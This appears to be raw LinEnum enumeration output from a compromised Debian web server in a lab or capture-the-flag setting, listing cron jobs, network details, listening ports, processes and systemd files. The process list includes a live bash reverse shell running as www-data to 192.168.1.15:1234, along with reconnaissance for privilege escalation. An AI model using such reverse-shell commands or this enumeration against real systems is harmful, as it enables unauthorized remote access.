+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+drwxr-xr-x 2 root root   4096 Sep  5  2019 /bin
+drwxr-xr-x 2 root root   4096 Sep  5  2019 /sbin
+drwxr-xr-x 2 root root  20480 Sep  5  2019 /usr/bin
+drwxrwsr-x 2 root staff  4096 Sep  5  2019 /usr/local/bin
+drwxrwsr-x 2 root staff  4096 Sep  5  2019 /usr/local/sbin
+drwxr-xr-x 2 root root   4096 Sep  5  2019 /usr/sbin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+
+
+[-] Current umask value:
+0022
+u=rwx,g=rx,o=rx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK           022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r-- 1 root root  722 May  3  2015 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  102 May  3  2015 .placeholder
+-rw-r--r--  1 root root  712 Jan  2  2017 php
+
+/etc/cron.daily:
+total 48
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  102 May  3  2015 .placeholder
+-rwxr-xr-x  1 root root  539 Sep 20  2017 apache2
+-rwxr-xr-x  1 root root 1474 Sep 14  2017 apt-compat
+-rwxr-xr-x  1 root root  355 Oct 25  2016 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Feb 23  2017 dpkg
+-rwxr-xr-x  1 root root 4125 Mar  3  2016 exim4-base
+-rwxr-xr-x  1 root root   89 May  6  2015 logrotate
+-rwxr-xr-x  1 root root 1065 Dec 13  2016 man-db
+-rwxr-xr-x  1 root root  249 May 17  2017 passwd
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  102 May  3  2015 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  102 May  3  2015 .placeholder
+-rwxr-xr-x  1 root root  723 Dec 13  2016 man-db
+
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[-] Systemd timers:
+NEXT                          LEFT       LAST                          PASSED       UNIT                         ACTIVATES
+Thu 2021-05-20 10:09:00 AEST  20min left Thu 2021-05-20 09:39:13 AEST  9min ago     phpsessionclean.timer        phpsessionclean.service
+Thu 2021-05-20 23:37:42 AEST  13h left   Thu 2021-05-20 07:24:58 AEST  2h 23min ago apt-daily.timer              apt-daily.service
+Fri 2021-05-21 06:49:06 AEST  21h left   Thu 2021-05-20 07:24:58 AEST  2h 23min ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Fri 2021-05-21 07:40:50 AEST  21h left   Thu 2021-05-20 07:40:50 AEST  2h 8min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+
+4 timers listed.
+Enable thorough tests to see inactive timers
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:15:f4:93 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.1.14/24 brd 192.168.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 2a01:cb08:8508:4400:a00:27ff:fe15:f493/64 scope global mngtmpaddr dynamic 
+       valid_lft 1786sec preferred_lft 586sec
+    inet6 fe80::a00:27ff:fe15:f493/64 scope link 
+       valid_lft forever preferred_lft forever
+
+
+[-] ARP history:
+192.168.1.15 dev eth0 lladdr 08:00:27:3f:70:e3 REACHABLE
+192.168.1.13 dev eth0 lladdr 5c:87:9c:d9:8b:1d STALE
+192.168.1.1 dev eth0 lladdr 20:9a:7d:40:f9:80 DELAY
+2a01:cb08:8508:4400:229a:7dff:fe40:f980 dev eth0 lladdr 20:9a:7d:40:f9:80 router REACHABLE
+fe80::229a:7dff:fe40:f980 dev eth0 lladdr 20:9a:7d:40:f9:80 router REACHABLE
+
+
+[-] Nameserver(s):
+nameserver 192.168.1.1
+
+
+[-] Nameserver(s):
+Global
+         DNS Servers: 192.168.1.1
+          DNS Domain: home
+          DNSSEC NTA: 10.in-addr.arpa
+                      16.172.in-addr.arpa
+                      168.192.in-addr.arpa
+                      17.172.in-addr.arpa
+                      18.172.in-addr.arpa
+                      19.172.in-addr.arpa
+                      20.172.in-addr.arpa
+                      21.172.in-addr.arpa
+                      22.172.in-addr.arpa
+                      23.172.in-addr.arpa
+                      24.172.in-addr.arpa
+                      25.172.in-addr.arpa
+                      26.172.in-addr.arpa
+                      27.172.in-addr.arpa
+                      28.172.in-addr.arpa
+                      29.172.in-addr.arpa
+                      30.172.in-addr.arpa
+                      31.172.in-addr.arpa
+                      corp
+                      d.f.ip6.arpa
+                      home
+                      internal
+                      intranet
+                      lan
+                      local
+                      private
+                      test
+
+Link 2 (eth0)
+      Current Scopes: LLMNR/IPv4 LLMNR/IPv6
+       LLMNR setting: yes
+MulticastDNS setting: no
+      DNSSEC setting: no
+    DNSSEC supported: no
+
+
+[-] Default route:
+default via 192.168.1.1 dev eth0 
+
+
+[-] Listening TCP:
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+LISTEN     0      128          *:22                       *:*                  
+LISTEN     0      20     127.0.0.1:25                       *:*                  
+LISTEN     0      80     127.0.0.1:3306                     *:*                  
+LISTEN     0      128          *:5355                     *:*                  
+LISTEN     0      128         :::80                      :::*                  
+LISTEN     0      128         :::22                      :::*                  
+LISTEN     0      20         ::1:25                      :::*                  
+LISTEN     0      128         :::5355                    :::*                  
+
+
+[-] Listening UDP:
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+UNCONN     0      0            *:5355                     *:*                  
+UNCONN     0      0      127.0.0.53%lo:53                       *:*                  
+UNCONN     0      0            *:68                       *:*                  
+UNCONN     0      0           :::5355                    :::*                  
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.6 204388  6744 ?        Ss   07:25   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S    07:25   0:00 [kthreadd]
+root         3  0.2  0.0      0     0 ?        S    07:25   0:19 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   07:25   0:00 [kworker/0:0H]
+root         7  0.1  0.0      0     0 ?        S    07:25   0:16 [rcu_sched]
+root         8  0.0  0.0      0     0 ?        S    07:25   0:00 [rcu_bh]
+root         9  0.0  0.0      0     0 ?        S    07:25   0:00 [migration/0]
+root        10  0.0  0.0      0     0 ?        S<   07:25   0:00 [lru-add-drain]
+root        11  0.0  0.0      0     0 ?        S    07:25   0:00 [watchdog/0]
+root        12  0.0  0.0      0     0 ?        S    07:25   0:00 [cpuhp/0]
+root        13  0.0  0.0      0     0 ?        S    07:25   0:00 [kdevtmpfs]
+root        14  0.0  0.0      0     0 ?        S<   07:25   0:00 [netns]
+root        15  0.0  0.0      0     0 ?        S    07:25   0:00 [khungtaskd]
+root        16  0.0  0.0      0     0 ?        S    07:25   0:00 [oom_reaper]
+root        17  0.0  0.0      0     0 ?        S<   07:25   0:00 [writeback]
+root        18  0.0  0.0      0     0 ?        S    07:25   0:00 [kcompactd0]
+root        19  0.0  0.0      0     0 ?        SN   07:25   0:00 [ksmd]
+root        21  0.0  0.0      0     0 ?        SN   07:25   0:00 [khugepaged]
+root        22  0.0  0.0      0     0 ?        S<   07:25   0:00 [crypto]
+root        23  0.0  0.0      0     0 ?        S<   07:25   0:00 [kintegrityd]
+root        24  0.0  0.0      0     0 ?        S<   07:25   0:00 [bioset]
+root        25  0.0  0.0      0     0 ?        S<   07:25   0:00 [kblockd]
+root        26  0.0  0.0      0     0 ?        S<   07:25   0:00 [devfreq_wq]
+root        27  0.0  0.0      0     0 ?        S<   07:25   0:00 [watchdogd]
+root        28  0.0  0.0      0     0 ?        S    07:25   0:00 [kswapd0]
+root        29  0.0  0.0      0     0 ?        S<   07:25   0:00 [vmstat]
+root        41  0.0  0.0      0     0 ?        S<   07:25   0:00 [kthrotld]
+root        42  0.0  0.0      0     0 ?        S<   07:25   0:00 [ipv6_addrconf]
+root        80  0.0  0.0      0     0 ?        S<   07:25   0:00 [ata_sff]
+root        91  0.0  0.0      0     0 ?        S    07:25   0:00 [kworker/u2:1]
+root       111  0.0  0.0      0     0 ?        S    07:25   0:00 [scsi_eh_0]
+root       112  0.0  0.0      0     0 ?        S<   07:25   0:00 [scsi_tmf_0]
+root       113  0.0  0.0      0     0 ?        S<   07:25   0:00 [bioset]
+root       115  0.4  0.0      0     0 ?        S<   07:25   0:38 [kworker/0:1H]
+root       149  0.5  0.0      0     0 ?        S    07:25   0:47 [jbd2/sda1-8]
+root       150  0.0  0.0      0     0 ?        S<   07:25   0:00 [ext4-rsv-conver]
+root       176  0.0  0.4  39176  4340 ?        Ss   07:25   0:00 /lib/systemd/systemd-journald
+root       181  0.0  0.0      0     0 ?        S    07:25   0:00 [kauditd]
+root       210  0.0  0.4  45916  4160 ?        Ss   07:25   0:00 /lib/systemd/systemd-udevd
+systemd+   251  0.0  0.4 127284  4152 ?        Ssl  07:25   0:00 /lib/systemd/systemd-timesyncd
+root       299  0.0  0.2  37980  2200 ?        Ss   07:25   0:00 /lib/systemd/systemd-logind
+message+   300  0.0  0.3  45132  3680 ?        Ss   07:25   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+root       307  0.0  0.2 250116  2984 ?        Ssl  07:25   0:00 /usr/sbin/rsyslogd -n
+root       308  0.0  0.2  29664  2860 ?        Ss   07:25   0:00 /usr/sbin/cron -f
+root       336  0.0  0.6  69944  6408 ?        Ss   07:25   0:00 /usr/sbin/sshd -D
+root       349  0.0  0.1  14536  1752 tty1     Ss+  07:25   0:00 /sbin/agetty --noclear tty1 linux
+mysql      448 11.1 22.4 654500 228704 ?       Ssl  07:25  15:58 /usr/sbin/mysqld
+root       449  0.0  2.7 331440 28268 ?        Ss   07:25   0:00 /usr/sbin/apache2 -k start
+www-data   464  4.4  2.8 334496 29188 ?        S    07:25   6:26 /usr/sbin/apache2 -k start
+www-data   465  4.4  2.9 334520 29864 ?        S    07:25   6:24 /usr/sbin/apache2 -k start
+www-data   468  4.5  3.3 335032 33848 ?        S    07:25   6:30 /usr/sbin/apache2 -k start
+Debian-+   770  0.0  0.2  56156  2468 ?        Ss   07:25   0:00 /usr/sbin/exim4 -bd -q30m
+root       784  0.0  0.1  20348  1036 ?        Ss   07:25   0:00 /sbin/dhclient -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+www-data   800  4.6  2.8 334416 28908 ?        S    07:30   6:29 /usr/sbin/apache2 -k start
+www-data   822  4.7  2.8 334408 29008 ?        S    07:31   6:35 /usr/sbin/apache2 -k start
+www-data   823  4.6  2.7 334548 28232 ?        S    07:31   6:25 /usr/sbin/apache2 -k start
+www-data   827  4.7  2.7 334572 28040 ?        S    07:31   6:33 /usr/sbin/apache2 -k start
+www-data  1017  2.8  3.2 334456 32672 ?        S    09:06   1:11 /usr/sbin/apache2 -k start
+www-data  1020  2.9  2.5 334408 26180 ?        S    09:07   1:13 /usr/sbin/apache2 -k start
+root      1079  0.0  0.0      0     0 ?        S    09:09   0:00 [kworker/0:0]
+www-data  1091  1.3  2.7 334404 28196 ?        S    09:26   0:17 /usr/sbin/apache2 -k start
+www-data  1112  0.0  0.0   4288   712 ?        S    09:39   0:00 sh -c /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.15/1234 0>&1'
+www-data  1113  0.0  0.2  17944  2836 ?        S    09:39   0:00 /bin/bash -c bash -i >& /dev/tcp/192.168.1.15/1234 0>&1
+www-data  1114  0.0  0.3  18168  3220 ?        S    09:39   0:00 bash -i
+root      1170  0.0  0.0      0     0 ?        S    09:39   0:00 [kworker/u2:0]
+root      1172  0.0  0.0      0     0 ?        S    09:39   0:00 [kworker/0:2]
+www-data  1179  0.0  0.3  18944  3940 ?        S    09:48   0:00 /bin/bash ./LinEnum.sh
+www-data  1180  0.0  0.3  18972  3684 ?        S    09:48   0:00 /bin/bash ./LinEnum.sh
+www-data  1181  0.0  0.0   4200   664 ?        S    09:48   0:00 tee -a
+systemd+  1355  0.0  0.3  49620  4072 ?        Ss   09:48   0:00 /lib/systemd/systemd-resolved
+root      1369  0.0  0.0      0     0 ?        S    09:48   0:00 [kworker/0:1]
+www-data  1379  0.0  0.2  18972  2932 ?        S    09:48   0:00 /bin/bash ./LinEnum.sh
+www-data  1380  0.0  0.2  36632  2912 ?        R    09:48   0:00 ps aux
+
+
+[-] Process binaries and associated permissions (from above list):
+-rwxr-xr-x 1 root root  1099016 May 16  2017 /bin/bash
+-rwxr-xr-x 1 root root   117160 Jul  6  2017 /lib/systemd/systemd-journald
+-rwxr-xr-x 1 root root   207336 Jul  6  2017 /lib/systemd/systemd-logind
+-rwxr-xr-x 1 root root   321952 Jul  6  2017 /lib/systemd/systemd-resolved
+-rwxr-xr-x 1 root root    39248 Jul  6  2017 /lib/systemd/systemd-timesyncd
+-rwxr-xr-x 1 root root   465680 Jul  6  2017 /lib/systemd/systemd-udevd
+-rwxr-xr-x 1 root root    57680 Mar 22  2017 /sbin/agetty
+-rwxr-xr-x 1 root root   487728 Jan  9  2017 /sbin/dhclient
+lrwxrwxrwx 1 root root       20 Jul  6  2017 /sbin/init -> /lib/systemd/systemd
+-rwxr-xr-x 1 root root   224208 Jul 30  2017 /usr/bin/dbus-daemon
+-rwxr-xr-x 1 root root   662632 Sep 20  2017 /usr/sbin/apache2
+-rwxr-xr-x 1 root root    48616 May  3  2015 /usr/sbin/cron
+-rwsr-xr-x 1 root root  1019656 Jun 14  2017 /usr/sbin/exim4
+-rwxr-xr-x 1 root root 17553608 Aug 11  2017 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root   651576 Jan 19  2017 /usr/sbin/rsyslogd
+-rwxr-xr-x 1 root root   791024 Jun 18  2017 /usr/sbin/sshd
+
+
+[-] /etc/init.d/ binary permissions:
+total 100
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rwxr-xr-x  1 root root 2225 Sep 20  2017 apache-htcacheclean
+-rwxr-xr-x  1 root root 8181 Sep 20  2017 apache2
+-rwxr-xr-x  1 root root 1232 Apr  7  2017 console-setup.sh
+-rwxr-xr-x  1 root root 3049 May  3  2015 cron
+-rwxr-xr-x  1 root root 2813 Jul 30  2017 dbus
+-rwxr-xr-x  1 root root 6754 Apr 19  2017 exim4
+-rwxr-xr-x  1 root root 3809 Mar 22  2017 hwclock.sh
+-rwxr-xr-x  1 root root 1479 May 19  2016 keyboard-setup.sh
+-rwxr-xr-x  1 root root 2044 Dec 26  2016 kmod
+-rwxr-xr-x  1 root root 5930 Aug 11  2017 mysql
+-rwxr-xr-x  1 root root 4597 Sep 16  2016 networking
+-rwxr-xr-x  1 root root 1191 Nov 22  2016 procps
+-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
+-rwxr-xr-x  1 root root 2868 Jan 19  2017 rsyslog
+-rwxr-xr-x  1 root root 4033 Jun 18  2017 ssh
+-rwxr-xr-x  1 root root  731 Jun  5  2017 sudo
+-rwxr-xr-x  1 root root 6087 Jul  6  2017 udev
+
+
+[-] /etc/init/ config file permissions:
+total 40
+drwxr-xr-x  2 root root 4096 Sep  5  2019 .
+drwxr-xr-x 81 root root 4096 May 20 07:25 ..
+-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
+-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
+-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
+-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
+-rw-r--r--  1 root root  637 Jun 18  2017 ssh.conf
+-rw-r--r--  1 root root  337 Jul  6  2017 udev.conf
+-rw-r--r--  1 root root  360 Jul  6  2017 udevmonitor.conf
+-rw-r--r--  1 root root  352 Jul  6  2017 udevtrigger.conf
+
+
+[-] /lib/systemd/* config file permissions:
+/lib/systemd/:
+total 5.3M
+drwxr-xr-x 20 root root  16K Sep  5  2019 system
+drwxr-xr-x  2 root root 4.0K Sep  5  2019 system-sleep
+drwxr-xr-x  2 root root 4.0K Sep  5  2019 network
+drwxr-xr-x  2 root root 4.0K Sep  5  2019 system-generators
+drwxr-xr-x  2 root root 4.0K Sep  5  2019 system-preset
+-rw-r--r--  1 root root 2.2M Jul  6  2017 libsystemd-shared-232.so
+-rw-r--r--  1 root root  484 Jul  6  2017 resolv.conf
+drwxr-xr-x  2 root root 4.0K Jul  6  2017 system-shutdown
+-rwxr-xr-x  1 root root 1.1M Jul  6  2017 systemd
+-rwxr-xr-x  1 root root 6.3K Jul  6  2017 systemd-ac-power
+-rwxr-xr-x  1 root root  19K Jul  6  2017 systemd-backlight
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-binfmt
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-cgroups-agent
+-rwxr-xr-x  1 root root  27K Jul  6  2017 systemd-cryptsetup
+-rwxr-xr-x  1 root root  19K Jul  6  2017 systemd-fsck
+-rwxr-xr-x  1 root root  23K Jul  6  2017 systemd-fsckd
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-hibernate-resume
+-rwxr-xr-x  1 root root  23K Jul  6  2017 systemd-hostnamed
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-initctl
+-rwxr-xr-x  1 root root 115K Jul  6  2017 systemd-journald
+-rwxr-xr-x  1 root root  35K Jul  6  2017 systemd-localed
+-rwxr-xr-x  1 root root 203K Jul  6  2017 systemd-logind
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-modules-load
+-rwxr-xr-x  1 root root 415K Jul  6  2017 systemd-networkd
+-rwxr-xr-x  1 root root  19K Jul  6  2017 systemd-networkd-wait-online
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-quotacheck
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-random-seed
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-remount-fs
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-reply-password
+-rwxr-xr-x  1 root root 315K Jul  6  2017 systemd-resolved
+-rwxr-xr-x  1 root root  19K Jul  6  2017 systemd-rfkill
+-rwxr-xr-x  1 root root  39K Jul  6  2017 systemd-shutdown
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-sleep
+-rwxr-xr-x  1 root root  23K Jul  6  2017 systemd-socket-proxyd
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-sysctl
+-rwxr-xr-x  1 root root 1.3K Jul  6  2017 systemd-sysv-install
+-rwxr-xr-x  1 root root  27K Jul  6  2017 systemd-timedated
+-rwxr-xr-x  1 root root  39K Jul  6  2017 systemd-timesyncd
+-rwxr-xr-x  1 root root 455K Jul  6  2017 systemd-udevd
+-rwxr-xr-x  1 root root  15K Jul  6  2017 systemd-update-utmp
+-rwxr-xr-x  1 root root  11K Jul  6  2017 systemd-user-sessions
+
+/lib/systemd/system:
+total 708K
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 mariadb@bootstrap.service.d
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 multi-user.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 sockets.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 sysinit.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 getty.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 graphical.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 local-fs.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 rescue.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 timers.target.wants
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 systemd-timesyncd.service.d
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 systemd-resolved.service.d
+drwxr-xr-x 2 root root 4.0K Sep  5  2019 rc-local.service.d
+-rw-r--r-- 1 root root  528 Sep 20  2017 apache-htcacheclean.service
+-rw-r--r-- 1 root root  537 Sep 20  2017 apache-htcacheclean@.service
+-rw-r--r-- 1 root root  346 Sep 20  2017 apache2.service
+-rw-r--r-- 1 root root  418 Sep 20  2017 apache2@.service
+-rw-r--r-- 1 root root  238 Sep 14  2017 apt-daily-upgrade.service
+-rw-r--r-- 1 root root  184 Sep 14  2017 apt-daily-upgrade.timer
+-rw-r--r-- 1 root root  225 Sep 14  2017 apt-daily.service
+-rw-r--r-- 1 root root  156 Sep 14  2017 apt-daily.timer
+-rw-r--r-- 1 root root 4.4K Aug 11  2017 mariadb.service
+-rw-r--r-- 1 root root 5.5K Aug 11  2017 mariadb@.service
+-rw-r--r-- 1 root root  366 Jul 30  2017 dbus.service
+-rw-r--r-- 1 root root  106 Jul 30  2017 dbus.socket
+lrwxrwxrwx 1 root root   14 Jul  6  2017 autovt@.service -> getty@.service
+-rw-r--r-- 1 root root  879 Jul  6  2017 basic.target
+-rw-r--r-- 1 root root  379 Jul  6  2017 bluetooth.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 bootlogd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 bootlogs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 bootmisc.service -> /dev/null
+-rw-r--r-- 1 root root  358 Jul  6  2017 busnames.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 busnames.target.wants
+lrwxrwxrwx 1 root root    9 Jul  6  2017 checkfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 checkroot-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 checkroot.service -> /dev/null
+-rw-r--r-- 1 root root  770 Jul  6  2017 console-getty.service
+-rw-r--r-- 1 root root  791 Jul  6  2017 container-getty@.service
+lrwxrwxrwx 1 root root    9 Jul  6  2017 cryptdisks-early.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 cryptdisks.service -> /dev/null
+-rw-r--r-- 1 root root  394 Jul  6  2017 cryptsetup-pre.target
+-rw-r--r-- 1 root root  366 Jul  6  2017 cryptsetup.target
+lrwxrwxrwx 1 root root   13 Jul  6  2017 ctrl-alt-del.target -> reboot.target
+lrwxrwxrwx 1 root root   25 Jul  6  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
+lrwxrwxrwx 1 root root   23 Jul  6  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service
+lrwxrwxrwx 1 root root   22 Jul  6  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service
+lrwxrwxrwx 1 root root   24 Jul  6  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service
+lrwxrwxrwx 1 root root   24 Jul  6  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
+lrwxrwxrwx 1 root root   25 Jul  6  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
+-rw-r--r-- 1 root root 1010 Jul  6  2017 debug-shell.service
+lrwxrwxrwx 1 root root   16 Jul  6  2017 default.target -> graphical.target
+-rw-r--r-- 1 root root  709 Jul  6  2017 dev-hugepages.mount
+-rw-r--r-- 1 root root  624 Jul  6  2017 dev-mqueue.mount
+-rw-r--r-- 1 root root 1.1K Jul  6  2017 emergency.service
+-rw-r--r-- 1 root root  431 Jul  6  2017 emergency.target
+-rw-r--r-- 1 root root  501 Jul  6  2017 exit.target
+-rw-r--r-- 1 root root  440 Jul  6  2017 final.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 fuse.service -> /dev/null
+-rw-r--r-- 1 root root  342 Jul  6  2017 getty-static.service
+-rw-r--r-- 1 root root  460 Jul  6  2017 getty.target
+-rw-r--r-- 1 root root 1.7K Jul  6  2017 getty@.service
+-rw-r--r-- 1 root root  558 Jul  6  2017 graphical.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 halt.service -> /dev/null
+-rw-r--r-- 1 root root  487 Jul  6  2017 halt.target
+-rw-r--r-- 1 root root  447 Jul  6  2017 hibernate.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 hostname.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 hwclock.service -> /dev/null
+-rw-r--r-- 1 root root  468 Jul  6  2017 hybrid-sleep.target
+-rw-r--r-- 1 root root  630 Jul  6  2017 initrd-cleanup.service
+-rw-r--r-- 1 root root  553 Jul  6  2017 initrd-fs.target
+-rw-r--r-- 1 root root  790 Jul  6  2017 initrd-parse-etc.service
+-rw-r--r-- 1 root root  521 Jul  6  2017 initrd-root-device.target
+-rw-r--r-- 1 root root  526 Jul  6  2017 initrd-root-fs.target
+-rw-r--r-- 1 root root  640 Jul  6  2017 initrd-switch-root.service
+-rw-r--r-- 1 root root  714 Jul  6  2017 initrd-switch-root.target
+-rw-r--r-- 1 root root  664 Jul  6  2017 initrd-udevadm-cleanup-db.service
+-rw-r--r-- 1 root root  723 Jul  6  2017 initrd.target
+-rw-r--r-- 1 root root  501 Jul  6  2017 kexec.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 killprocs.service -> /dev/null
+-rw-r--r-- 1 root root  677 Jul  6  2017 kmod-static-nodes.service
+lrwxrwxrwx 1 root root   28 Jul  6  2017 kmod.service -> systemd-modules-load.service
+-rw-r--r-- 1 root root  395 Jul  6  2017 local-fs-pre.target
+-rw-r--r-- 1 root root  507 Jul  6  2017 local-fs.target
+-rw-r--r-- 1 root root  405 Jul  6  2017 machine.slice
+lrwxrwxrwx 1 root root   28 Jul  6  2017 module-init-tools.service -> systemd-modules-load.service
+lrwxrwxrwx 1 root root    9 Jul  6  2017 motd.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountall-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountall.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountdevsubfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountkernfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountnfs-bootclean.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 mountnfs.service -> /dev/null
+-rw-r--r-- 1 root root  492 Jul  6  2017 multi-user.target
+-rw-r--r-- 1 root root  464 Jul  6  2017 network-online.target
+-rw-r--r-- 1 root root  461 Jul  6  2017 network-pre.target
+-rw-r--r-- 1 root root  480 Jul  6  2017 network.target
+-rw-r--r-- 1 root root  514 Jul  6  2017 nss-lookup.target
+-rw-r--r-- 1 root root  473 Jul  6  2017 nss-user-lookup.target
+-rw-r--r-- 1 root root  354 Jul  6  2017 paths.target
+-rw-r--r-- 1 root root  552 Jul  6  2017 poweroff.target
+-rw-r--r-- 1 root root  377 Jul  6  2017 printer.target
+-rw-r--r-- 1 root root  693 Jul  6  2017 proc-sys-fs-binfmt_misc.automount
+-rw-r--r-- 1 root root  603 Jul  6  2017 proc-sys-fs-binfmt_misc.mount
+lrwxrwxrwx 1 root root   22 Jul  6  2017 procps.service -> systemd-sysctl.service
+-rw-r--r-- 1 root root  568 Jul  6  2017 quotaon.service
+-rw-r--r-- 1 root root  628 Jul  6  2017 rc-local.service
+lrwxrwxrwx 1 root root   16 Jul  6  2017 rc.local.service -> rc-local.service
+lrwxrwxrwx 1 root root    9 Jul  6  2017 rc.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 rcS.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 reboot.service -> /dev/null
+-rw-r--r-- 1 root root  543 Jul  6  2017 reboot.target
+-rw-r--r-- 1 root root  396 Jul  6  2017 remote-fs-pre.target
+-rw-r--r-- 1 root root  482 Jul  6  2017 remote-fs.target
